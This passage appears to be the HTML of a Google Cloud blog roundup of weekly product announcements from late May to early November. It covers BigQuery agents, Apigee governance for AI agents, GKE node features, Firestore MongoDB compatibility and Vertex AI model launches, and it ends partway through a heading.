        "description": "<div class=\"block-paragraph\"><p>Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. </p><hr /><p><b>Tip</b>: Not sure where to find what you’re looking for on the Google Cloud blog? Start here: <a href=\"https://cloud.google.com/blog/topics/inside-google-cloud/complete-list-google-cloud-blog-links-2021\">Google Cloud blog 101: Full list of topics, links, and resources</a>.</p><hr /><p></p></div>\n<div class=\"block-paragraph_advanced\"><h3>Nov 3 - Nov 7</h3>\n<ul>\n<li><strong>Announcing the Data Engineering Agent<br /></strong>Data teams can now automate complex SQL pipeline tasks with the new Data Engineering Agent for BigQuery, available in Preview. This agent simplifies development, maintenance, and troubleshooting, allowing engineers to focus on strategic initiatives. It supports natural language pipeline creation, intelligent modification, and seamless migration from legacy tools.<br /><br /><a href=\"https://cloud.google.com/blog/products/data-analytics/exploring-the-data-engineering-agent-in-bigquery\" rel=\"noopener\" target=\"_blank\">Transform your data engineering workflows today!</a></li>\n<li><strong>From Threat Model to TTX: Bringing a New Design Partner to the Table<br /></strong>Gain an overview of threat modeling, how threat models can be performed rapidly, and why threat model scenarios make excellent tabletop scenarios - especially for products that are still in development.<br /><br />To get more information about threat modeling or tabletop exercises, check out <a href=\"https://cloud.google.com/security/resources/defenders-advantage?e=48754805\" rel=\"noopener\" target=\"_blank\">The Defender’s Advantage</a> or reach out to a <a href=\"https://www.mandiant.com/contact-us\" rel=\"noopener\" target=\"_blank\">Mandiant cybersecurity expert</a> for specialized assistance.</li>\n<li><strong>Application Monitoring now includes a Topology.<br /></strong>Application Monitoring now includes a graphical representation of runtime dependencies (i.e Topology) for your App Hub defined application. This now allows you to quickly understand your app architecture, spot anomalous runtime interactions and resolve issues flagged from alerts quicker. Runtime dependencies are extracted from the OpenTelemetry traces you send to Cloud Trace from your App Hub registered workload.<br /><br />Follow the outline <a href=\"https://docs.cloud.google.com/app-hub/docs/set-up-app-hub\" rel=\"noopener\" target=\"_blank\">here</a> to register your app and unlock the benefits of Application Monitoring and <a href=\"https://cloud.google.com/monitoring/docs/application-topology\" rel=\"noopener\" target=\"_blank\">its newly launched Topology</a></li>\n<li><strong>Supercharge AI Agents: Apply Enterprise Governance to GenAI Workflows with Apigee<br /></strong>As Generative AI agents move to production, you need control over cost, reliability, and security. A powerful new pattern introduces Apigee as the unified AI Agent Gateway for Large Language Model (LLM) calls. Route agent traffic through Apigee to gain immediate enterprise-grade governance, including dynamic circuit breaking, token consumption quotas, and sensitive data masking. A new Apigee wrapper for the Agent Development Kit (ADK) simplifies implementation. Turn your agents into manageable, secure AI products.<br /><br /><a href=\"https://discuss.google.dev/t/supercharge-your-ai-agents-applying-enterprise-governance-to-genai/284164\" rel=\"noopener\" target=\"_blank\">Read</a> the full article and explore the new pattern.</li>\n</ul>\n<h3>Oct 20 - Oct 24</h3>\n<ul>\n<li><strong>Dataframe visualization in Colab Enterprise.</strong> Use <a href=\"https://cloud.google.com/colab/docs/visualization-cells\" rel=\"noopener\" target=\"_blank\">visualization cells</a> to create custom, stylized visualizations of your DataFrames: no coding required! Choose your fields, chart type, aggregation, and color scheme, then see a visualization of your data without leaving your notebook. Check out the <a href=\"https://cloud.google.com/bigquery/docs/visualize-data-colab\" rel=\"noopener\" target=\"_blank\">tutorial</a> and get started with data visualization today.</li>\n</ul>\n<h3>Oct 13 - Oct 17</h3>\n<ul>\n<li><strong>Build Serverless AI in the Cloud Run Hackathon</strong><br />Ready to go from idea to global scale in minutes? The Cloud Run Hackathon is here! Build serverless AI apps with AI Studio, orchestrate intelligent agents, or harness the power of GPUs. Compete for a share of $50,000+ in prizes!\n<ul>\n<li>Submissions are open from Oct 6, 2025 to Nov 10, 2025.</li>\n<li>Learn more and register: run.devpost.com</li>\n</ul>\n</li>\n</ul>\n<h3>Oct 6 - Oct 10</h3>\n<ul>\n<li>Multi-agent AI systems help you optimize complex and dynamic processes by segmenting them into discrete tasks that multiple specialized AI agents collaboratively execute. To get started with building secure and reliable multi-agent AI systems, see this reference architecture guide: <a href=\"https://cloud.google.com/architecture/choose-design-pattern-agentic-ai-system\" rel=\"noopener\" target=\"_blank\">Design a multi-agent AI system in Google cloud</a>. The example architecture in this guide showcases a couple of agent patterns: sequential, and loop. For a comprehensive review of all the possible agent design patterns and for help with choosing patterns that are appropriate for your use cases, see this design guide: <a href=\"https://cloud.google.com/architecture/choose-design-pattern-agentic-ai-system\" rel=\"noopener\" target=\"_blank\">Choose a design pattern for your agentic AI system</a>.</li>\n</ul>\n<h3>Sept 29 - Oct 3</h3>\n<ul>\n<li><strong>Announcing Koog Supports for Agent2Agent protocol (A2A)<br /></strong>The future of interconnected AI is here. We're thrilled to announce that Koog now supports A2A, a protocol that lets agents talk directly, securely, and seamlessly across companies and clouds. For Kotlin developers, this unlocks a new era of powerful, enterprise-grade AI. Build sophisticated agents that automatically discover and collaborate with other services, all while calling on Google Cloud's state-of-the-art models like Gemini directly from your workflows. Stop building bridges and start creating truly intelligent, interconnected systems today. <a href=\"https://www.google.com/url?q=https%3A%2F%2Fblog.jetbrains.com%2Fai%2F2025%2F10%2Fkoog-a2a-building-connected-ai-agents-in-kotlin%2F\" rel=\"noopener\" target=\"_blank\">Learn more about building with Koog, A2A, and Google Cloud</a><span>.</span></li>\n</ul>\n<h3>Sept 15 - 19</h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><strong>Your AI is Now a Local Expert: Grounding with Google Maps is GA</strong><br /></span>We are excited to announce the General Availability (GA) of Grounding with Google Maps in Vertex AI. This feature lets developers build generative AI applications that are connected to real-world, up-to-date information from Google Maps, using its data on over 250 million places worldwide.<br /><br />To learn more and get started, visit our <a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/grounding/grounding-with-google-maps\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> and check out our</span> <a href=\"https://goog-maps-grounding-demo-h75yp5b4ia-uc.a.run.app/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">demo</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><a href=\"https://discuss.google.dev/t/production-ready-yolo-model-training-serving-workflow-on-vertex-ai/263788\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"><strong>Production-ready YOLO model training serving workflow on Vertex AI</strong></span></a><span style=\"vertical-align: baseline;\"><br /></span>This guide walks you through a complete, automated workflow for training a custom YOLO model on Vertex AI. You'll learn how to use a custom training job, package the model in a custom prediction container, and register it in the Vertex AI Model Registry, making it ready for easy deployment. Best of all, this approach is designed to work directly with existing Vertex AI managed datasets for object detection, meaning you can reuse the same data you're already using for AutoML models.<br /><br /><span style=\"vertical-align: baseline;\">Checkout details on </span><a href=\"https://discuss.google.dev/t/production-ready-yolo-model-training-serving-workflow-on-vertex-ai/263788?u=hill_yu\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">developer forums</span></a></li>\n</ul>\n<h3>Sept 8 - 12</h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Scaling Inference To Billions of Users And AI Agents: Discover the architecture required to serve AI models at a planetary scale. This article details how Google Cloud’s ecosystem—from the GKE Inference Gateway for smart load balancing to the power of custom TPUs and open-source engines like vLLM—provides a production-ready path. Move beyond the hype and learn how to build for the next wave of AI. </span><a href=\"https://medium.com/google-cloud/scaling-inference-to-billions-of-users-and-agents-516d5d9f5da7\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Explore the technical deep-dive.</span></a></li>\n<li><span style=\"vertical-align: baseline;\">We're celebrating the one-year anniversary of bringing Confidential Computing with Intel TDX to Google Cloud. We've been shipping new capabilities to help you protect your most sensitive data while it's in use. </span><span style=\"vertical-align: baseline;\">Now Generally Available:</span>\n<ul>\n<li>Confidential GKE Nodes with Intel TDX: Secure entire Kubernetes clusters, node pools, and workloads.</li>\n<li>Confidential Space with Intel TDX: Build secure data clean rooms for collaboration on sensitive information.</li>\n<li>Confidential GPUs: Protect cutting-edge AI workloads with Confidential NVIDIA H100s GPUs on GCE and GKE.<br /><br />We've also expanded Intel TDX to more regions! <a href=\"https://cloud.google.com/blog/products/identity-security/from-clicks-to-clusters-confidential-computing-expands-with-intel-tdx\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read the blog</span></a></li>\n</ul>\n</li>\n</ul>\n<h3>Aug 25 - 29</h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Applied AI for Modern Manufacturers: New original growth series, hosted by </span><a href=\"https://www.linkedin.com/in/jacobrhall\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Jake Hall</span></a><span style=\"vertical-align: baseline;\">, The Manufacturing Millennial, that dives into leading trends, best practices, and what companies are doing right now with AI in manufacturing. Hear from industry thought leaders - </span><a href=\"https://www.linkedin.com/in/rickbullotta\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Rick Bullotta</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.linkedin.com/in/jonathanmwise/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Jonathan Wise</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.linkedin.com/in/walkerdreynolds\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Walker Reynolds</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://www.linkedin.com/in/berardino-baratta\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Berardino Baratta</span></a><span style=\"vertical-align: baseline;\"> - and Google Cloud experts - </span><a href=\"https://www.linkedin.com/in/praveenrao\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Praveen Rao</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.linkedin.com/in/ericlam\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Eric Lam</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.linkedin.com/in/dave122/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dave Nguyen Ph.D</span></a><span style=\"vertical-align: baseline;\">., </span><a href=\"https://www.linkedin.com/in/geoffrey-hirschheim/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Geoffrey Hirschheim</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://www.linkedin.com/in/jimmya\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Jim Anderson</span></a><span style=\"vertical-align: baseline;\">. Watch Modules 1 and  2 now, where we delve into the </span><strong style=\"vertical-align: baseline;\">AI Innovation and trends</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">AI Costs and ROI in the Era of Digital Manufacturing</strong><span style=\"vertical-align: baseline;\">. Next module kicks off Tuesday, Sep 2. </span><a href=\"https://cloudonair.withgoogle.com/events/applied-ai-modern-manufacturers?tab=module-3&amp;expand=module:module-text-image-7\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Join now</span></a></li>\n<li>\n<p><a href=\"https://cloud.google.com/blog/products/databases/firestore-with-mongodb-compatibility-is-now-ga\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Firestore with MongoDB compatibility is now generally available (GA)</strong></a><span style=\"vertical-align: baseline;\">: Developers can now build cost-effective, scalable, and highly reliable apps on Firestore's serverless database using a familiar MongoDB-compatible API. With the general availability of Firestore with MongoDB compatibility, the 600,000 active developers within the Firestore community can now use existing MongoDB application code, drivers, and tools, as well as the open-source MongoDB ecosystem, with Firestore's serverless service. Firestore offers benefits like multi-region replication, virtually unlimited scalability, up to 99.999% SLA, single-digit millisecond read performance, integrated Google Cloud governance, and pay-as-you-go pricing. </span><a href=\"https://cloudonair.withgoogle.com/events/firestore-compatibility-in-action?utm_source=twitter&amp;utm_medium=unpaidsoc&amp;utm_campaign=fy25q3-googlecloudtech-web-data-in_feed-no-brand-global&amp;utm_content=-&amp;utm_term=-&amp;linkId=16456513\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Register now</span></a><span style=\"vertical-align: baseline;\"> for the webinar on September 9th for a deep dive into Firestore with MongoDB compatibility.</span></p>\n</li>\n</ul>\n<h3>Aug 18 - 22</h3>\n<ul>\n<li>Earth Engine in BigQuery is now Generally Available, bringing advanced geospatial analytics directly to your BigQuery workflows. <a href=\"https://cloud.google.com/bigquery/docs/raster-data\" rel=\"noopener\" target=\"_blank\">Unlock insights</a> with satellite data!</li>\n</ul>\n<h3>Aug 11 - Aug 15</h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">New HPC VM and Slurm-gcp Images: </strong><span style=\"vertical-align: baseline;\">A new HPC VM Image (under the project cloud-hpc-image-public) is now available, featuring a Rocky Linux 8-based image, IntelMPI v2021.16, and RDMA drivers. In partnership with SchedMD, new Slurm images (Slurm 25.05) have also been released. These are based on the latest HPC VM Image and are available for Ubuntu 22.04/24.04 Accelerator Images (ARM/AMD64) and Debian 12. These releases allow for the deployment of Slurm-ready clusters on GCP, providing the advantages of an HPC-optimized and performance-tested foundation. </span><a href=\"https://cloud.google.com/compute/docs/instances/create-hpc-vm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read more</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Scaling our Gemini Embedding model in Vertex AI</strong><span style=\"vertical-align: baseline;\">. Following increased popularity from its General Availability launch in May, we've recently increased quota and input size limits for customers of Vertex AI's most powerful text embedding model, gemini-embedding-001.</span>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Customers can now send up to 250 input texts per request (generating 250 embeddings) instead of only a single piece of text, bringing improved throughput and decreased round-trip network latency to large-scale embedding applications.</span></li>\n<li><span style=\"vertical-align: baseline;\">We've increased quota limits for this model by 10x for most users, allowing hassle-free scaling of embedding applications to millions of tokens per minute and beyond.</span><br /><br /><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/embeddings/get-text-embeddings\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get started</span></a><span style=\"vertical-align: baseline;\"> with Gemini Embeddings today!</span></li>\n</ul>\n</li>\n</ul>\n<h3>Aug 4 - Aug 8</h3>\n<ul>\n<li>\n<p><strong>GKE Node Memory Swap in private preview</strong>: You can now configure swap space on your GKE Standard nodes to provide a crucial buffer against Out-of-Memory (OOM) errors for memory-intensive applications, especially during unexpected usage spikes. Enabling swap can improve workload resilience, reduce pod evictions due to memory pressure, and enhance overall application stability and cost-effectiveness. This feature is currently available in a private preview.</p>\n<ul>\n<li>\n<p>Contact your Google Cloud account team for more information and to request access.</p>\n</li>\n<li>\n<p>If you'd like to see more configurations, please contact your account team or make a feature request on our <a href=\"https://issuetracker.google.com/issues/new?component=187077&amp;template=1162666\" rel=\"noopener\" target=\"_blank\">issue tracker</a>!</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Unlock Peak Performance</strong>: GKE Topology Manager is Now Generally Available: For customers running performance-sensitive workloads like AI/ML and HPC, GKE Topology Manager is now GA and ready to optimize your performance through NUMA alignment. By ensuring CPU, memory, and GPU resources are allocated on the same NUMA node, the Topology Manager minimizes cross-socket latency and maximizes throughput for your most demanding applications. Configure your alignment policies via the NodeConfig API to achieve significant performance gains.</p>\n<ul>\n<li>Achieve these performance gains by configuring your alignment policies via the <a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/node-system-config\">NodeConfig API</a>.</li>\n<li>If you'd like to see more expansion of Topology manager, please contact your account team or make a feature request on our <a href=\"https://issuetracker.google.com/issues/new?component=187077&amp;template=1162666\" rel=\"noopener\" target=\"_blank\">issue tracker</a>!</li>\n</ul>\n</li>\n<li>\n<p><strong>Fine-Tune at Scale</strong>: A Massive GKE NodeConfig Expansion for All Workloads: GKE has massively expanded node customization capabilities, adding nearly 130 new Sysctl and Kubelet configurations. This gives you finer-grained control for any workload needing node customization, performance requirements, or application-specific tuning. By replacing complex DaemonSets with native controls, you can benefit from enhanced security, high flexibility, faster node startup times, and less operational management.</p>\n<ul>\n<li>Check out our <a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/node-system-config\">public documentation</a> to learn how to consume these new NodeConfig options.</li>\n<li>If you'd like to see more configurations, please contact your account team or make a feature request on our <a href=\"https://issuetracker.google.com/issues/new?component=187077&amp;template=1162666\" rel=\"noopener\" target=\"_blank\">issue tracker</a>!</li>\n</ul>\n</li>\n<li>\n<p><strong>New capability for managing licenses in Compute Engine</strong>: We are announcing a new capability in Compute Engine which allows users to easily change the OS licenses on their VMs. Users can now append, remove, or replace OS licenses, enabling seamless transitions between license types—such as converting Red Hat Enterprise Linux from pay-as-you-go (PAYG) to bring-your-own subscription (BYOS), or upgrading from Ubuntu to Ubuntu Pro—without needing to redeploy instances. This feature empowers customers to meet their evolving licensing with speed and flexibility. To learn more, <a href=\"https://cloud.google.com/compute/docs/licenses/manage\">read about managing licenses on Compute Engine</a>.</p>\n</li>\n<li>\n<p><strong>GKE Turns 10 Hackathon</strong>: Calling all developers! Google Kubernetes Engine (GKE) is turning 10, and we're celebrating with a hackathon! Join us to build powerful AI agents that interact with microservice applications using Google Kubernetes Engine and Google AI models. Compete for over $50,000 in prizes and demonstrate the power of building agentic AI on GKE.</p>\n<ul>\n<li>Submissions are open from Aug 18, 2025 to Sept, 22 2025</li>\n<li>Learn more and register: <a href=\"https://gketurns10.devpost.com/\" rel=\"noopener\" target=\"_blank\">gketurns10.devpost.com</a></li>\n</ul>\n</li>\n</ul>\n<h3>Jul 28 - Aug 1</h3>\n<ul>\n<li><strong>Now GA: C4 VMs with Local SSD, bare metal, and larger shapes, on Intel Xeon 6: </strong>C4's expanded shapes are now GA! This expansion introduces C4 shapes with Google’s next-gen Titanium Local SSD, C4 bare metal instances, and new extra-large shapes, all powered by the latest Intel Xeon 6 processors, Granite Rapids. We’re excited to be the first leading hyperscaler to bring Xeon 6 to customers, delivering performance gains of up to 30% for general compute and up to 60% for ML recommendation workloads, and up to 35% lower access latency on Titanium Local SSD shapes. Learn more <a href=\"https://cloud.google.com/blog/products/compute/c4-vms-based-on-intel-6th-gen-xeon-granite-rapids-now-ga\" rel=\"noopener\" target=\"_blank\">here</a>!</li>\n</ul>\n<h3>Jul 14 - 18</h3>\n<ul>\n<li><strong>DMS SQL Server to PostgreSQL migrations are now generally available! </strong>Accelerate your SQL Server modernization to Cloud SQL for PostgreSQL or AlloyDB for PostgreSQL with:\n<ul>\n<li>Automatic database schema and code conversion </li>\n<li>Gemini augmented code conversion </li>\n<li>Gemini assisted PostgreSQL training and code improvements</li>\n<li>Low-downtime, CDC based data movement</li>\n</ul>\n</li>\n</ul>\n<p><a href=\"https://cloud.google.com/database-migration/docs/sqlserver-to-alloydb/scenario-overview?_gl=1*109toza*_ga*NzM3NjU1NjkwLjE3NTIwNzU4MTE.*_ga_4LYFWVHBEB*czE3NTI0MjE3MzYkbzEkZzEkdDE3NTI0MjIxNTAkajYwJGwwJGgw\" rel=\"noopener\" target=\"_blank\">Learn more</a><span> and start your migration journey today!</span></p>\n<h3>Jul 7 - 11</h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Level up your AI Agent game with \"The Agent Factory,\" a new video podcast for developers!</strong><span style=\"vertical-align: baseline;\"> We're going beyond the buzz to explore practical design, build, deploy, &amp; management strategies for production-ready AI agents using Google Cloud. Expect code snippets, architecture deep dives, and integrations with open-source frameworks. </span><a href=\"https://goo.gle/theagentfactory\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Subscribe now!</span></a></li>\n</ul>\n<h3>Jun 23 - 27</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Announcing partnership between Maxim AI and Google Cloud's Vertex AI to evaluate agentic applications</strong><span style=\"vertical-align: baseline;\"> — Maxim AI offers a comprehensive platform to help teams build, evaluate, and observe their AI agents with greater speed and confidence, covering the entire AI lifecycle from prompt engineering to production monitoring. This new partnership deeply integrates Vertex AI's Gen AI evaluation service directly within the Maxim AI environment, allowing users to leverage Gemini to power assistant responses and evaluate them using Vertex AI's comprehensive suite of evaluators. This provides access to metrics such as helpfulness, relevance, safety, and trajectory. The setup allows users to simulate, evaluate, and trace complex multi-turn interactions on Maxim, helping teams bring reliable AI products to market faster through a seamless developer experience. To learn more, check out this</span> <a href=\"https://www.getmaxim.ai/blog/evaluating-a-healthcare-use-case-using-vertex-ai-and-maxim-ai-part-1/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog from Maxim AI</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Run non-request workloads at scale with Cloud Run Worker Pools, now in Public Preview </strong><span style=\"vertical-align: baseline;\">— </span><span style=\"font-style: italic; vertical-align: baseline;\">Looking for the ease-of-use and scalability of serverless, without being limited to HTTP request-driven workloads? </span><a href=\"https://cloud.google.com/run/docs/deploy-worker-pools\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run Worker Pools</span></a><span style=\"vertical-align: baseline;\"> provide the same elasticity and high-quality developer experience as Cloud Run Services, but are designed for non-request workloads. Worker Pools are ideal for pull-based use cases like processing messages from Pub/Sub or Kafka, and other backend processing.  Check out the</span> <a href=\"https://cloud.google.com/run/docs/overview/what-is-cloud-run\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public documentation</span></a><span style=\"vertical-align: baseline;\"> to learn more about how to choose between Services, Jobs, and Worker Pools. Then give Worker Pools a try by</span> <a href=\"https://cloud.google.com/run/docs/quickstarts/workerpools/deploy-workerpool\"><span style=\"text-decoration: underline; vertical-align: baseline;\">deploying a sample Worker Pool</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Building a Multi-Agent Research Assistant for Financial Analysis with Schroders &amp; Google Cloud </strong><span style=\"vertical-align: baseline;\">—</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">Financial analysts spend hours grappling with ever-increasing volumes of market and company data to extract key signals, combine diverse data sources, and produce company research. To maximise its edge as an active manager, Schroders wants to enable its analysts to shift from data collection to the higher-value strategic thinking that is critical for business scalability and client investment performance.  To achieve this, Schroders and Google Cloud collaborated to build a multi-agent research assistant prototype using Vertex AI Agent Builder. Find out more</span> <a href=\"https://cloud.google.com/blog/topics/customers/how-schroders-built-its-multi-agent-financial-analysis-research-assistant\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h3>Jun 16 - 20</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplify Your Multi-Cloud Strategy with Cloud Location Finder, now in Public Preview</strong><span style=\"vertical-align: baseline;\">: As cloud environments expand beyond traditional architectures to include multiple clouds, managing your infrastructure effectively becomes more complex. Imagine effortlessly accessing consistent and up-to-date location information across different cloud providers, so your multi-cloud applications are designed and optimized with performance, security, and regulatory compliance in mind. </span><span style=\"vertical-align: baseline;\">Today, we are making this a reality with Cloud Location Finder, a new Google Cloud service which provides up-to-date location data across Google Cloud, Amazon Web Services (AWS), Azure, and Oracle Cloud Infrastructure (OCI). Now, you can strategically deploy workloads across different cloud providers with confidence and control. Cloud Location Finder is accessible via REST APIs and gcloud CLI, explore the Cloud Location Finder</span> <a href=\"https://cloud.google.com/location-finder/docs\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> and</span> <a href=\"https://cloud.google.com/blog/products/compute/googles-cloud-location-finder-unifies-multi-cloud-location-data\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog</span></a><span style=\"vertical-align: baseline;\"> to learn more.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">SOTA Gemini Text Embedding is Now Generally Available in Vertex AI</strong><span style=\"vertical-align: baseline;\">: We recently launched a new Gemini Embedding text model (gemini-embedding-001) through the </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/embeddings/get-text-embeddings\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI GenAI API</span></a><span style=\"vertical-align: baseline;\">. This groundbreaking model, leveraging Gemini's core language understanding, sets a new benchmark for text embeddings. It's the first unified model to excel across English, multilingual text, and code, outperforming previous models (text-embedding-005, text-multilingual-embedding-002) and achieving top ranking on the </span><a href=\"https://huggingface.co/spaces/mteb/leaderboard\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MTEB Multilingual leaderboard</span></a><span style=\"vertical-align: baseline;\"> (100+ tasks). Our internal benchmarks demonstrate substantial performance improvements across various industry verticals, including retail, news, finance, healthcare, legal, and code. Detailed results are available in our </span><a href=\"https://deepmind.google/research/publications/157741/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">technical report</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Backup vaults now support disk backups and multi-regions</strong><span style=\"vertical-align: baseline;\">: We’ve added exciting new features to Google Cloud Backup and Disaster Recovery service! You can now secure your Persistent Disk and Hyperdisk backups in backup vaults, protecting them from cyber attacks and accidental data loss. In addition, backup vaults can now be created in multi-region storage locations, maximizing your data resilience and supporting compliance with business continuity requirements. </span><a href=\"https://cloud.google.com/blog/products/storage-data-transfer/backup-vaults-add-support-for-disk-backup-and-multi-region\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Check out the blog to learn more!</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">DeepSeek R1, a powerful 671B parameters model, is now available as a fully managed API on Vertex AI in Preview, making advanced AI capabilities more accessible to developers</strong><span style=\"vertical-align: baseline;\">. This Model as a Service (MaaS) offering eliminates the need for extensive GPU resources and infrastructure management, allowing developers to focus on building applications. DeepSeek R1 on Vertex AI provides a simple, scalable API with features like transparent \"chain-of-thought\" reasoning and enterprise-ready security. It's currently available at no additional cost during the preview, and can be accessed via UI, REST API, or the OpenAI Python API Client Library. </span><a href=\"https://www.googlecloudcommunity.com/gc/Community-Blogs/Introducing-DeepSeek-R1-Model-as-a-service-on-Vertex-AI-Model/ba-p/918265\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Learn more</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h3>Jun 9 - 13</h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Serverless Spark Now GA in BigQuery: Unified Analytics, Accelerated</strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-google-cloud-serverless-for-apache-spark-in-bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Serverless for Apache Spark is now generally available</span></a><span style=\"vertical-align: baseline;\"> in BigQuery, offering a unified developer experience in BigQuery Studio. Run Spark and SQL side-by-side on the same data, powered by the Lightning Engine for up to 3.6x faster performance and enhanced with Gemini productivity. Simplify your data pipelines and accelerate insights with this deeply integrated, zero-ops solution.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Cloud Pub/Sub introduced Pub/Sub Single Message Transforms (SMTs) to make it easy to perform simple data transformations right within Pub/Sub: </strong><span style=\"vertical-align: baseline;\">An overarching goal of Pub/Sub is to simplify streaming architectures. We already greatly simplified data movement with Import Topics and</span> <a href=\"https://cloud.google.com/pubsub/docs/subscriber#export_subscription\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Export Subscriptions</span></a><span style=\"vertical-align: baseline;\">, which removed the need to use additional services for ingesting raw streaming data through Pub/Sub into destinations like</span> <a href=\"https://cloud.google.com/pubsub/docs/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\">. Pub/Sub Single Message Transforms (SMTs), designed to be a suite of features making it easy to validate, filter, enrich, and alter individual messages as they move in real time. The first SMT is available now: JavaScript User-Defined Functions (UDFs), which allows you to perform simple, lightweight modifications to message attributes and/or the data directly within Pub/Sub via snippets of JavaScript code. JavaScript UDFs as the first Single Message Transform is generally available starting today for all users. You'll find the new \"Add Transform\" option in the Google Cloud console when you create a topic or subscription in your Google Cloud project. You can also use gcloud CLI to start using JavaScript Single Message Transforms today.</span></li>\n<li><span style=\"vertical-align: baseline;\">This analysis evaluates the efficiency of fine-tuning a Llama 3-8B model on Vertex AI using both a single A100 GPU and a distributed four-A100 setup with Axolotl. While both methods achieved similar model convergence, the results underscore the power of distributed training. The process, which took 1 day and 20 hours on a single device, was completed in just 11 hours in the distributed environment—a dramatic acceleration. This speed was achieved with consistently high GPU utilization (94%), though at the cost of higher system and GPU memory overhead. </span>For a detailed breakdown of the methodology, resource utilization metrics, and performance curves, you can review the complete work <a href=\"https://medium.com/@kkshitiz_70654/fine-tuning-at-scale-single-device-vs-distributed-training-9eb2a99c3673\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul>\n<h3>May 26 - 